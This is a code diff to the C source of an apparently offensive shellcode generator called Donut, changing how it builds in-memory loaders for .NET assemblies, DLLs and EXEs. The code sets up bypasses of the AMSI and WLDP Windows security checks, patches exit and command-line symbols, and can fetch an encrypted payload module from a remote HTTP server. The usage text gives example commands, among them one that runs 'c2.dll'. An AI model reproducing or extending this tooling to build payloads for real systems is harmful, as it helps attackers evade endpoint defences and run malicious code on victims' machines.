@@ -605,7 +605,7 @@ static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
     // Set the type of module
     mod->type     = fi->type;
     mod->thread   = c->thread;
-    mod->ansi     = c->ansi;
+    mod->unicode  = c->unicode;
     mod->compress = c->compress;
     
     // DotNet assembly?
@@ -703,9 +703,9 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
     DPRINT("Allocating space for instance");
     inst_len = sizeof(DONUT_INSTANCE);
     
-    // if this is a PIC instance, add the size of module
+    // if the module is embedded, add the size of module
     // that will be appended to the end of structure
-    if(c->inst_type == DONUT_INSTANCE_PIC) {
+    if(c->inst_type == DONUT_INSTANCE_EMBED) {
       DPRINT("The size of module is %" PRIi32 " bytes. " 
              "Adding to size of instance.", c->mod_len);
       inst_len += c->mod_len;
@@ -762,13 +762,9 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
     }
     // save how many API to resolve
     inst->api_cnt = cnt;
-    inst->dll_cnt = 0;
-
-    strcpy(inst->dll_name[inst->dll_cnt++], "ole32.dll");
-    strcpy(inst->dll_name[inst->dll_cnt++], "oleaut32.dll");
-    strcpy(inst->dll_name[inst->dll_cnt++], "wininet.dll");  
-    strcpy(inst->dll_name[inst->dll_cnt++], "mscoree.dll");
-    strcpy(inst->dll_name[inst->dll_cnt++], "shell32.dll");
+    
+    //  Each DLL required by the loader API is separated by semi-colon
+    strcpy(inst->dll_names, "ole32;oleaut32;wininet;mscoree;shell32;dnsapi");
         
     // if module is .NET assembly
     if(c->mod_type == DONUT_MODULE_NET_DLL ||
@@ -819,43 +815,29 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
     strcpy(inst->dataname,       ".data");
     strcpy(inst->kernelbase,     "kernelbase");
     
-    // ansi symbols
-    strcpy(inst->acmdln,         "_acmdln");
-    strcpy(inst->_acmdln,        "__p__acmdln");
-    strcpy(inst->argv,           "__argv");
-    strcpy(inst->_argv,           "__p___argv");
+    // ansi and unicode symbols to patch for unmanaged EXE command line
+    strcpy(inst->cmd_syms,       "_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv");
     
-    // unicode symbols
-    strcpy(inst->wcmdln,         "_wcmdln");
-    strcpy(inst->_wcmdln,        "__p__wcmdln");
-    strcpy(inst->wargv,          "__wargv");
-    strcpy(inst->_wargv,          "__p___wargv");
-    
-    strcpy(inst->exitproc1,      "ExitProcess");
-    strcpy(inst->exitproc2,      "exit");
-    strcpy(inst->exitproc3,      "_exit");
-    strcpy(inst->exitproc4,      "_cexit");
-    strcpy(inst->exitproc5,      "_c_exit");
-    strcpy(inst->exitproc6,      "quick_exit");
-    strcpy(inst->exitproc7,      "_Exit");
-    
+    // exit-related API to replace with RtlExitUserThread
+    strcpy(inst->exit_api,       "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit");
+
     // required to disable WLDP
     strcpy(inst->wldp,           "wldp");
     strcpy(inst->wldpQuery,      "WldpQueryDynamicCodeTrust");
     strcpy(inst->wldpIsApproved, "WldpIsClassInApprovedList");
 
     // set the type of instance we're creating
-    inst->type = c->inst_type;
+    inst->type     = c->inst_type;
     // indicate if we should call RtlExitUserProcess to terminate host process
     inst->exit_opt = c->exit_opt;
     // set the fork option
-    inst->fork = c->fork;
+    inst->fork     = c->fork;
     // set the entropy level
-    inst->entropy = c->entropy;
+    inst->entropy  = c->entropy;
     
     // if the module will be downloaded
     // set the URL parameter and request verb
-    if(inst->type == DONUT_INSTANCE_URL) {
+    if(inst->type == DONUT_INSTANCE_HTTP) {
       if(c->entropy != DONUT_ENTROPY_NONE) {
         // if no module name specified
         if(c->modname[0] == 0) {
@@ -871,13 +853,13 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
         memset(c->modname, 'A', DONUT_MAX_MODNAME);
       }
       DPRINT("Setting URL parameters");
-      strcpy(inst->http.url, c->url);
+      strcpy(inst->server, c->server);
       // append module name
-      strcat(inst->http.url, c->modname);
+      strcat(inst->server, c->modname);
       // set the request verb
-      strcpy(inst->http.req, "GET");
+      strcpy(inst->http_req, "GET");
       
-      DPRINT("Payload will attempt download from : %s", inst->http.url);
+      DPRINT("Payload will attempt download from : %s", inst->server);
     }
 
     inst->mod_len = c->mod_len;
@@ -885,7 +867,7 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
     c->inst       = inst;
     c->inst_len   = inst_len;
     
-    if(c->inst_type == DONUT_INSTANCE_URL && 
+    if(c->inst_type == DONUT_INSTANCE_HTTP && 
        c->entropy == DONUT_ENTROPY_DEFAULT) 
     {
       DPRINT("encrypting module for download");
@@ -898,8 +880,8 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
         c->mod, 
         c->mod_len);
     }
-    // if PIC, copy module to instance
-    if(inst->type == DONUT_INSTANCE_PIC) {
+    // if embedded, copy module to instance
+    if(inst->type == DONUT_INSTANCE_EMBED) {
       DPRINT("Copying module data to instance");
       memcpy(&c->inst->module.x, c->mod, c->mod_len);
     }
@@ -922,7 +904,7 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
     return DONUT_ERROR_SUCCESS;
 }
   
-// given a configuration, create a PIC that will run from anywhere in memory
+// given a configuration, create a position-independent code that will run from anywhere in memory
 EXPORT_FUNC 
 int DonutCreate(PDONUT_CONFIG c) {
     uint8_t   *pl;
@@ -951,8 +933,8 @@ int DonutCreate(PDONUT_CONFIG c) {
     // instance not specified?
     DPRINT("Validating instance type %" PRIx32 "", c->inst_type);
     
-    if(c->inst_type != DONUT_INSTANCE_PIC &&
-       c->inst_type != DONUT_INSTANCE_URL) {
+    if(c->inst_type != DONUT_INSTANCE_EMBED &&
+       c->inst_type != DONUT_INSTANCE_HTTP) {
          
       return DONUT_ERROR_INVALID_PARAMETER;
     }
@@ -979,34 +961,34 @@ int DonutCreate(PDONUT_CONFIG c) {
       return DONUT_ERROR_INVALID_ENTROPY;
     }
     
-    if(c->inst_type == DONUT_INSTANCE_URL) {
+    if(c->inst_type == DONUT_INSTANCE_HTTP) {
       DPRINT("Validating URL");
       
       // no URL? exit
-      if(c->url[0] == 0) {
+      if(c->server[0] == 0) {
         return DONUT_ERROR_INVALID_PARAMETER;
       }
       // doesn't begin with one of the following? exit
-      if((strnicmp(c->url, "http://",  7) != 0) &&
-         (strnicmp(c->url, "https://", 8) != 0)) {
+      if((strnicmp(c->server, "http://",  7) != 0) &&
+         (strnicmp(c->server, "https://", 8) != 0)) {
            
         return DONUT_ERROR_INVALID_URL;
       }
       // invalid length?
-      if(strlen(c->url) <= 8) {
+      if(strlen(c->server) <= 8) {
         return DONUT_ERROR_URL_LENGTH;
       }
-      // ensure URL parameter and module name don't exceed DONUT_MAX_URL
-      url_len = strlen(c->url);
+      // ensure URL parameter and module name don't exceed DONUT_MAX_NAME
+      url_len = strlen(c->server);
       
       // if the end of string doesn't have a forward slash
       // add one more to account for it
-      if(c->url[url_len - 1] != '/') {
-        strcat(c->url, "/");
+      if(c->server[url_len - 1] != '/') {
+        strcat(c->server, "/");
         url_len++;
       }
       
-      if((url_len + DONUT_MAX_MODNAME) >= DONUT_MAX_URL) {
+      if((url_len + DONUT_MAX_MODNAME) >= DONUT_MAX_NAME) {
         return DONUT_ERROR_URL_LENGTH;
       }
     }
@@ -1106,7 +1088,7 @@ int DonutCreate(PDONUT_CONFIG c) {
       }
     #endif
     // 3. If the module will be stored on a remote server
-    if(c->inst_type == DONUT_INSTANCE_URL) {
+    if(c->inst_type == DONUT_INSTANCE_HTTP) {
       DPRINT("Saving %s to disk.", c->modname);
       // save the module to disk using random name
       fd = fopen(c->modname, "wb");
@@ -1116,7 +1098,7 @@ int DonutCreate(PDONUT_CONFIG c) {
         fclose(fd);
       }
     }
-    // 4. calculate size of PIC + instance combined
+    // 4. calculate size of shellcode + instance combined
     if(c->arch == DONUT_ARCH_X86) {
       c->pic_len = sizeof(LOADER_EXE_X86) + c->inst_len + 32;
     } else 
@@ -1395,13 +1377,13 @@ static void usage (void) {
     printf("       Only the finest artisanal donuts are made of shells.\n\n");   
     printf("                   -MODULE OPTIONS-\n\n");
     printf("       -n <name>            Module name. Randomly generated by default with entropy enabled.\n");
-    printf("       -u <URL>             HTTP server that will host the donut module.\n");
-    printf("       -e <level>           Entropy. 1=disable, 2=use random names, 3=random names + symmetric encryption (default)\n\n");
+    printf("       -s <server>          HTTP server that will host the donut module.\n");
+    printf("       -e <level>           Entropy. 1=none, 2=use random names, 3=random names + symmetric encryption (default)\n\n");
     
     printf("                   -PIC/SHELLCODE OPTIONS-\n\n");    
     printf("       -a <arch>            Target architecture : 1=x86, 2=amd64, 3=x86+amd64(default).\n");
-    printf("       -b <level>           Bypass AMSI/WLDP : 1=skip, 2=abort on fail, 3=continue on fail.(default)\n");
-    printf("       -o <outfile_file>    Default is \"loader.bin\"\n");
+    printf("       -b <level>           Bypass AMSI/WLDP : 1=none, 2=abort on fail, 3=continue on fail.(default)\n");
+    printf("       -o <path>            Output file to save loader. Default is \"loader.bin\"\n");
     printf("       -f <format>          Output format. 1=raw (default), 2=base64, 3=c, 4=ruby, 5=python, 6=powershell, 7=C#, 8=hex\n");
     printf("       -y                   Create new thread for entrypoint and return handle to caller. Default uses existing thread.\n");
     printf("       -x <action>          Exiting. 1=exit thread (default), 2=exit process\n\n");
@@ -1409,19 +1391,19 @@ static void usage (void) {
     printf("                   -FILE OPTIONS-\n\n");
     printf("       -c <namespace.class> Optional class name.  (required for .NET DLL)\n");
     printf("       -d <name>            AppDomain name to create for .NET. Randomly generated by default with entropy enabled.\n");
-    printf("       -m <method | api>    Optional method or API name for DLL. (a method is required for .NET DLL)\n");
+    printf("       -m <method | api>    Optional method or function for DLL. (a method is required for .NET DLL)\n");
     printf("       -p <parameters>      Optional parameters/command line inside quotations for DLL method/function or EXE.\n");
-    printf("       -w                   Command line is passed to unmanaged DLL function as ANSI. (default is UNICODE)\n");
+    printf("       -w                   Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)\n");
     printf("       -r <version>         CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.\n");
     printf("       -t                   Create new thread for entrypoint of unmanaged EXE.\n");
 #ifdef WINDOWS
-    printf("       -z <engine>          Pack/Compress file. 1=disable, 2=LZNT1, 3=Xpress, 4=Xpress Huffman\n\n");
+    printf("       -z <engine>          Pack/Compress file. 1=none, 2=LZNT1, 3=Xpress, 4=Xpress Huffman\n\n");
 #endif
 
     printf(" examples:\n\n");
     printf("    donut c2.dll\n");
     printf("    donut -a1 -cTestClass -mRunProcess -pnotepad.exe loader.dll\n");
-    printf("    donut loader.dll -c TestClass -m RunProcess -p\"calc notepad\" -u http://remote_server.com/modules/\n");
+    printf("    donut loader.dll -c TestClass -m RunProcess -p\"calc notepad\" -s http://remote_server.com/modules/\n");
     
     exit (0);
 }
@@ -1432,7 +1414,7 @@ int main(int argc, char *argv[]) {
     int          i, err;
     char         *mod_type;
     char         *arch_str[3] = { "x86", "amd64", "x86+amd64" };
-    char         *inst_type[2]= { "PIC", "URL" };
+    char         *inst_type[3]= { "Embedded", "HTTP", "DNS" };
     
     printf("\n");
     printf("  [ Donut shellcode generator v0.9.3\n");
@@ -1442,14 +1424,14 @@ int main(int argc, char *argv[]) {
     memset(&c, 0, sizeof(c));
     
     // default settings
-    c.inst_type = DONUT_INSTANCE_PIC;     // file is embedded
+    c.inst_type = DONUT_INSTANCE_EMBED;   // file is embedded
     c.arch      = DONUT_ARCH_X84;         // dual-mode (x86+amd64)
     c.bypass    = DONUT_BYPASS_CONTINUE;  // continues loading even if disabling AMSI/WLDP fails
     c.format    = DONUT_FORMAT_BINARY;    // default output format
     c.compress  = DONUT_COMPRESS_NONE;    // compression is disabled by default
     c.entropy   = DONUT_ENTROPY_DEFAULT;  // enable random names + symmetric encryption by default
     c.exit_opt  = DONUT_OPT_EXIT_THREAD;  // default behaviour is to exit the thread
-    c.ansi      = 0;                      // command line will be converted to unicode
+    c.unicode   = 0;                      // command line will not be converted to unicode for unmanaged DLL function
     c.fork      = 0;                      // upon execution, create a new thread
     
     // parse arguments
@@ -1519,15 +1501,15 @@ int main(int argc, char *argv[]) {
             c.thread = 1;
             break;
           }
-          // URL of remote module
-          case 'u': {
-            strncpy(c.url, get_param(argc, argv, &i), DONUT_MAX_URL - 2);
-            c.inst_type = DONUT_INSTANCE_URL;
+          // server
+          case 's': {
+            strncpy(c.server, get_param(argc, argv, &i), DONUT_MAX_NAME - 2);
+            c.inst_type = DONUT_INSTANCE_HTTP;
             break;
           }
-          // don't convert command line to unicode? only applies to unmanaged DLL function
+          // convert param to unicode? only applies to unmanaged DLL function
           case 'w': {
-            c.ansi = 1;
+            c.unicode = 1;
             break;
           }
           // call RtlExitUserProcess to terminate host process
@@ -1614,13 +1596,13 @@ int main(int argc, char *argv[]) {
     }
     printf("  [ Target CPU    : %s\n", arch_str[c.arch - 1]);
     
-    if(c.inst_type == DONUT_INSTANCE_URL) {
+    if(c.inst_type == DONUT_INSTANCE_HTTP) {
       printf("  [ Module name   : %s\n", c.modname);
-      printf("  [ Upload to     : %s\n", c.url);
+      printf("  [ Upload to     : %s\n", c.server);
     }
     
     printf("  [ AMSI/WDLP     : %s\n",
-      c.bypass == DONUT_BYPASS_NONE  ? "skip" : 
+      c.bypass == DONUT_BYPASS_NONE  ? "none" : 
       c.bypass == DONUT_BYPASS_ABORT ? "abort" : "continue"); 
     
     printf("  [ Shellcode     : \"%s\"\n", c.output);
